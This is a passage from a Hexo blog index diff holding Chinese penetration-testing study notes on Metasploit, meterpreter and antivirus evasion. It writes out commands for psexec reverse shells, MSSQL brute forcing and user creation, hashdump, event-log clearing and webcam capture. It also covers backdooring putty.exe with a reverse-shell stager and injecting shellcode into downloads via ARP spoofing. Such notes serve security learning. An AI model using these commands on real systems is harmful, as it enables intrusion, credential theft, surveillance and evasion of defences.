root</li><li>run</li></ul></li></ul></li><li><p>Windows缺少的补丁</p><ul><li><p>基于已经取得的session进行检测</p></li><li><p>use post/windows/gather/enum_patches</p></li><li><p>检查失败</p><ul><li>Known bug in WMI query, try migrating to another process</li><li>迁移到另一个进程再次尝试</li></ul></li></ul></li><li><p>Mssql扫描端口</p><ul><li>TCP 1433或动态端口/如果是动态端口，则在UDP1434查询TCP端口号</li><li>use auxiliary/scanner/mssql/mssql_ping</li></ul></li><li><p>爆破mssql密码</p><ul><li>use auxiliary/scanner/mssql/mssql_login</li></ul></li><li><p>远程执行代码</p><ul><li>use auxiliary/admin/mssql/mssql_exec</li><li>set cmd net user user pass /add</li></ul></li><li><p>FTP版本扫描</p><ul><li>search ftp_version</li></ul></li><li><p>FTP是否支持匿名登陆</p><ul><li>search anonymous</li><li>search ftp/anoymous</li><li>search ftp_login</li></ul></li><li><p>use auxiliary/scanner/[tab]</p><ul><li>多尝试，实操。</li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MSF-exploit、payload、meterpreter、msfcli</title>
+      <link href="/2020/11/25/MSF-exploit%E3%80%81payload%E3%80%81meterpreter%E3%80%81msfcli/"/>
+      <url>/2020/11/25/MSF-exploit%E3%80%81payload%E3%80%81meterpreter%E3%80%81msfcli/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>以下两个用winserver2003测试成功。</p><ul><li><p>Active expolit</p><ul><li>use exploit/windows/smb/psexec</li><li>set RHOST 1.1.1.14</li><li>set PAYLOAD windows/shell/reverse_tcp</li><li>set LHOST 1.1.1.10set LPORT 4444</li><li>set SMBUSER user1</li><li>set SMBPASS pass1</li><li>exploit</li></ul></li><li><p>Passive exploit</p><ul><li>search ms07_017</li></ul><a id="more"></a><ul><li>use 0</li><li>set payload windows/shell/reverse_tcp</li><li>set servhost 1.1.1.10</li><li>set lhost 1.1.1.10</li><li>set lport 4444</li><li>exploit</li></ul></li></ul><hr><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><ul><li><p>use payload/windows/shell_bind_tcp</p></li><li><p>generate(生成的payload含有坏字符)</p><ul><li>generate -b ‘\x00’</li><li>generate -b ‘\x00\x02\x44’</li><li>会自动选择最优的encoder</li></ul></li><li><p>手动指定编码模块</p><ul><li>show encoders</li><li>generate -e x86/nonalpha</li><li>generate -b ‘\x00\xff’ -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe</li></ul></li><li><p>NOP：no-operation/Next Operation(无任何操作）</p><ul><li>EiP返回到存储NOP sled的任意地址时将递增，最终导致shellcode执行</li><li>generate -s 14(payload前面的NOP的长度)</li></ul></li><li><p>-t</p></li><li><p>-f 选择payload的语言。</p></li></ul><hr><h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><ul><li><p>高级、动态、可拓展的Payload</p><ul><li>基于meterpreter上下文，利用更多漏洞发起攻击</li><li>后渗透测试阶段一站式操作界面</li></ul></li><li><p>完全基于内存的DLL注入式payload（不写硬盘）</p><ul><li>注入合法系统进程，并建立stager</li><li>基于Stager上传和预加载DLL进行拓展模块的注入（客户端API）</li><li>基于stager建立的socket连接建立加密的TLS/1.0通信隧道</li><li>利用TLS隧道进一步加载后续拓展模块（避免网络取证）</li></ul></li><li><p>服务端使用C语言编写</p></li><li><p>客户端（运行在被渗透的机器）提供基于ruby的全特性API（支持任何语言）</p></li></ul><h5 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h5><ul><li><p>用meterpreter的payload获取到目标shel后，sessions -i 进入meterpreter的命令界面。help查看帮助。</p></li><li><p>background退出当前session</p></li><li><p>一些基本命令可以使用（即便在windows操作系统）</p><ul><li>cd、ls、cat、pwd、dir、mkdir、mv、rm、rmdir、edit</li><li>lpwd、lcd、lls（在命令前加l,就是在本机执行命令）</li></ul></li><li><p>run、bgrun（跑一些脚本）</p></li><li><p>clearev 清除日志（windows事件日志查看器）</p></li><li><p>download（默认下载到/tmp）</p></li><li><p>upload /usr/share/windows-binaries/nc.exe c:\windows\system32</p></li><li><p>getuid、getsystem（切换为system用户）、getprivs、getproxy、</p></li><li><p>getpid(查看当前session注入的进程）、ps查看所有进程，migrate（把自己迁移到其它进程）</p></li><li><p>hashdump、sysinfo</p></li><li><p>show_mount、search</p></li><li><p>arp、netstat、route</p></li><li><p>idletime、resourece、</p></li><li><p>record_mic、webcam_list、webcam_snap -i 1 -v false</p></li><li><p>python拓展</p><ul><li>load python</li><li>python_execute”print(‘asdf’)”</li><li>python_execute”import os;cd =os.getcwd()” -r cd</li><li>python_import -f find.py</li></ul></li></ul><hr><h4 id="msfcli"><a href="#msfcli" class="headerlink" title="msfcli"></a>msfcli</h4><ul><li><p>编写脚本时便于引用</p></li><li><p>msfconsole -x “use xxx;set xx xxx;set xx xx;exploit”</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MSF-基本命令</title>
+      <link href="/2020/11/24/MSF-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
+      <url>/2020/11/24/MSF-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><ul><li><p>目前最流行、最强大、最具拓展性的渗透测试平台软件</p></li><li><p>基于Metasploit进行渗透测试和漏洞分析的流程和方法</p></li><li><p>2003年由HD More发布第一版，2007年用ruby重写</p><ul><li>集成了渗透测试标准（PETS）思想</li><li>一定程度上统一了渗透测试和漏洞研究的工作环境</li><li>新的攻击代码可以比较容易的加入框架</li></ul><a id="more"></a></li><li><p>开发活跃、版本更新频繁（每周）</p><ul><li>早期版本基于社区力量维护，被Rapid7收购后打造出其商业版本产品</li><li>目前分化为四个版本，社区版本依然十分活跃</li><li>HD More说：为Metasploit写书是种自虐- -</li></ul></li></ul><hr><h3 id="MSF架构"><a href="#MSF架构" class="headerlink" title="MSF架构"></a>MSF架构</h3><ul><li>Rex<ul><li>基本功能库，用于完成日常基本任务无需人工手动编码实现</li><li>处理Socket连接访问、协议应答（http/SSL/SMB等）</li><li>编码转换（XOR、Base64、Unicode）</li></ul></li><li>MSf::Core<ul><li>提供MSF的核心基本API、是框架的核心功能实现库</li></ul></li><li>MSF:Base<ul><li>提供友好的API接口，便于模块调用的库</li></ul></li><li>Plugin插件<ul><li>连接和调用外部扩展功能和系统（调用sqlmap、nessus、OpenVAS)</li></ul></li></ul><hr><h4 id="技术功能模块"><a href="#技术功能模块" class="headerlink" title="技术功能模块"></a>技术功能模块</h4><ul><li><p>/usr/share/metasploit-framework/modules/</p></li><li><p>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法。</p></li><li><p>Payload：成功exploit之后，真正在目标系统执行的代码或指令</p><ul><li>Single：all in one，不需要依赖其它文件，大小比较大</li><li>Stager：目标计算机内存有限时，先传输一个较小的payload用于建立连接</li><li>Stages：利用stager建立的连接下载的后续payload</li><li>Stager、stages都有多种类型，适用于不同场景</li></ul></li><li><p>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块。</p></li><li><p>Encoders：对payload进行加密</p></li><li><p>Nops：提高payload稳定性及维持大小</p></li><li><p>evasion：免杀0.0</p></li></ul><hr><h4 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h4><ul><li><p>Banner</p></li><li><p>color</p></li><li><p>connect</p></li><li><p>show</p></li><li><p>search</p><ul><li>search xxx,</li><li>search name:mysql/path:scada/platform:aix/type:aux/author:aaron/cve:2020/可多条件同时搜索</li></ul></li><li><p>search ms08_067</p><ul><li>use 0</li><li>info</li><li>show options/payloads/targes/advanced/evasion/missing(显示需要设置，但是还没设置的参数)</li></ul></li><li><p>edit</p></li><li><p>check(大部分exploit没有)</p></li><li><p>back</p></li></ul><hr><ul><li><p>db_xxx</p></li><li><p>db_connect -y /usr/share/metasploit-framework/config/database.yml</p></li><li><p>db_nmap：调用nmap，结果会保存进数据库</p></li><li><p>hosts</p><ul><li>hosts 1.1.1.1</li><li>hosts -u，只查看在线host</li><li>host -c xxx,只查看xxx列</li><li>host -S xxx,查看信息中包含xxx的host</li></ul></li><li><p>services</p><ul><li>services -S</li><li>services -p 445或services -p 1-500</li><li>services -c host,port 只显示host port 这两列</li><li>services </li></ul></li><li><p>vulns</p><ul><li>查看漏洞信息</li></ul></li><li><p>creds</p><ul><li>查看密码相关信息</li></ul></li><li><p>loot</p><ul><li>查看hash值</li></ul></li><li><p>db_export</p><ul><li>db_export -f xml /root/msfbak.xml</li></ul></li><li><p>db_import</p><ul><li>nmap  -A192.168.0.12 -oX nmap.xml，nmap生成的xml也可以导入。</li></ul></li></ul><hr><ul><li><p>setg RHOSTS 1.1.1.1,全局设置RHOSTS变量为1.1.1.1</p></li><li><p>unsetg RHOSTS</p></li><li><p>save 保存当前配置</p></li><li><p>jobs/kill 0</p></li><li><p>sessions 查看建立的连接</p><ul><li>session -i xx，进入某个session</li></ul></li><li><p>route 通过指定session路由流量</p><ul><li><code>route add 10.1.1.0 255.255.255.0 4</code>,通往指定网段的流量由session4路由</li></ul></li><li><p>irb （framework::version）</p><ul><li>开发接口</li></ul></li><li><p>resource</p><ul><li>把要执行的msf命令写入文件中，</li><li>msfconsole -r r.rc</li><li>然后resource -r 调用</li></ul></li><li><p>load，unload</p><ul><li>加载或释放外部模块，插件，比如nessus，openvas等等</li></ul></li><li><p>loadpath，调用指定目录中的模块</p></li></ul><hr><h4 id="Exploit-模块"><a href="#Exploit-模块" class="headerlink" title="Exploit 模块"></a>Exploit 模块</h4><ul><li>Active expolit<ul><li>use exploit/windows/smb/psexec</li><li>set RHOST 1.1.1.14</li><li>set PAYLOAD windows/shell/reverse_tcp</li><li>set LHOST 1.1.1.10set LPORT 4444</li><li>set SMBUSER user1</li><li>set SMBPASS pass1</li><li>exploit</li></ul></li><li><h2 id="Passive-exploit"><a href="#Passive-exploit" class="headerlink" title="Passive exploit"></a>Passive exploit</h2></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>免杀-Backdoorfactory</title>
+      <link href="/2020/11/23/%E5%85%8D%E6%9D%80-Backdoorfactory/"/>
+      <url>/2020/11/23/%E5%85%8D%E6%9D%80-Backdoorfactory/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><h4 id="Backdoor-factory"><a href="#Backdoor-factory" class="headerlink" title="Backdoor-factory"></a>Backdoor-factory</h4><ul><li>Patch<ul><li>通过替换exe、dll、注册表等方法修复系统漏洞或问题的方法</li><li>BDF：向二进制文件中增加或者删除代码内容<ul><li>某些受保护的二进制程序无法patch</li><li>存在一定概率文件会被patch破坏掉</li></ul></li></ul></li><li>后门工厂<ul><li>将shellcode代码patch进模板文件，躲避AV检查</li><li>支持msf payload、自定义payload</li></ul></li></ul><h5 id="msf使用的patch方法（BDF也支持）"><a href="#msf使用的patch方法（BDF也支持）" class="headerlink" title="msf使用的patch方法（BDF也支持）"></a>msf使用的patch方法（BDF也支持）</h5><ul><li>覆盖程序入口<ul><li><code>msfvenom -p windows/shell/reverse_tcp</code></li></ul></li><li>创建新的线程执行shellcode并跳回原程序入口<ul><li><code>msfvenom -p windows/shell/reverse_tcp -k</code></li><li>增加代码片段，跳转执行后跳回源程序入口</li></ul></li></ul><h5 id="CTP方法"><a href="#CTP方法" class="headerlink" title="CTP方法"></a>CTP方法</h5><ul><li><p>增加新的代码段section,与MSF的-k方法类似</p></li><li><p>使用现有的代码缝隙（code cave）存放shellcode</p></li><li><p>Codecave</p><ul><li>二进制文件中超过两个字节的连续x00区域（代码片段间区域）</li><li>根据统计判断，代码缝隙是在编译器在进行编译时造成的，不同的编译器产生的代码缝隙大小不同。</li></ul></li><li><p>单个代码缝隙不足以存放完整shellcode时</p><ul><li>多codecave跳转</li><li>结合msf的stager方法</li></ul></li><li><p>patch选项</p><ul><li>附加代码段</li><li>单codecave注入</li><li>多codecave注入</li></ul></li></ul><hr><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ul><li><p>查看是否支持<code>backdoor-factory -f putty.exe -S</code></p></li><li><p>查看代码缝隙<code>backdoor-factory -f putty.exe -c -l 100</code> </p></li><li><p>查看payload<code>backdoor-factory -f putty.exe -s show</code></p></li><li><p><code>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_thread -H 192.168.1.119 -P 4444</code></p></li></ul><hr><h4 id="BDFproxy-通过mitmproxy实现"><a href="#BDFproxy-通过mitmproxy实现" class="headerlink" title="BDFproxy(通过mitmproxy实现)"></a>BDFproxy(通过mitmproxy实现)</h4><ul><li>基于流量劫持，动态注入shellcode（ARP spoof、DNS spoof、fake AP）</li><li>注入shellcode到下载文件的流量中</li><li>会自动清楚PE的签名，用0覆盖</li></ul><h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><ul><li><p><code>sysctl -w net.ipv4.ip_forward=1</code></p></li><li><p><code>iptables -t nat -A PREROUTING -p tcp --dport 80/443 -j REDIRECT -- to-ports 8080</code></p></li><li><p><code>vi /etc/bdfproxy/bdfproxy.cfg</code></p><ul><li>proxyMode=transparent</li><li>修改侦听IP地址并启动bdfproxy</li></ul></li><li><p>arpspoof -i eth0 -t 1.1.1.2 1.1.1.1</p></li><li><p>启动MSF</p></li></ul><h4 id="Mana"><a href="#Mana" class="headerlink" title="Mana"></a>Mana</h4><ul><li>无线Ap</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>免杀-Veil、shellter</title>
+      <link href="/2020/11/22/%E5%85%8D%E6%9D%80-Veil%E3%80%81shellter/"/>
+      <url>/2020/11/22/%E5%85%8D%E6%9D%80-Veil%E3%80%81shellter/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Veil-evasion"><a href="#Veil-evasion" class="headerlink" title="Veil-evasion"></a>Veil-evasion</h3><ul><li><p>属于Veil-framework框架的一部分</p></li><li><p>由Python语言编写</p></li><li><p>用于自动生成免杀payload</p><ul><li><p>集成msf payload，支持自定义payload</p></li><li><p>集成各种注入技术</p></li><li><p>集成各种第三方工具</p><ul><li>Hyperion、PEScrambler、BackDoor Factory</li></ul><a id="more"></a></li><li><p>集成各种开发打包运行环境</p><ul><li>Python：pyinstaller py2exe</li><li>C#：mono for.NET</li><li>C：mingw32</li></ul></li></ul></li></ul><hr><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ul><li>按照指引使用payload生成一个exe，路径在<code>/var/lib/veil/output/compiled/xxx.exe</code></li><li>同时会生成一个msf配置文件在<code>/var/lib/veil/output/handlers/xxx.rc</code><ul><li><code>msfconsole -r xxx.rc</code>或者在msf命令行手动敲里面的命令，侦听reverseShell的连接</li></ul></li><li>在把python打包成exe时，可以使用pwnstaller进行混淆</li></ul><hr><h4 id="Veil-catapult"><a href="#Veil-catapult" class="headerlink" title="Veil-catapult"></a>Veil-catapult</h4><ul><li>Payload的投递工具<ul><li>集成veil-evasion生成免杀payload或自定义payload</li><li>使用Impacket上传二进制payload文件</li><li>利用SMB</li></ul></li></ul><hr><p>另一种免杀思路</p><ul><li>传统防病毒查杀原理<ul><li>查找文件特殊字符串，匹配查杀</li></ul></li><li>找到触发AV查杀的精确字符串，将其修改<ul><li>将执行程序分片成很多小段</li><li>将包含MZ头的第一个片段与后续片段依次组合后交给AV查杀</li><li>重复以上步骤，最终精确定位出</li><li>Evade、hexeditor</li></ul></li></ul><hr><ol><li>自己写</li><li>加密</li><li>不写文件</li><li>找到特征字符串</li></ol><hr><h4 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a>shellter</h4><ul><li>shellcode 注入工具，我们可以将shellcode注入到其它程序上，从而来躲避杀毒软件的查杀。</li><li>只支持32位PE程序，使用正常的exe文件作为模板，将payload代码加入模板内</li><li>参考：<a href="https://www.cnblogs.com/hkleak/p/12912706.html" target="_blank" rel="noopener">https://www.cnblogs.com/hkleak/p/12912706.html</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>免杀</title>
       <link href="/2020/11/20/%E5%85%8D%E6%9D%80/"/>
       <url>/2020/11/20/%E5%85%8D%E6%9D%80/</url>
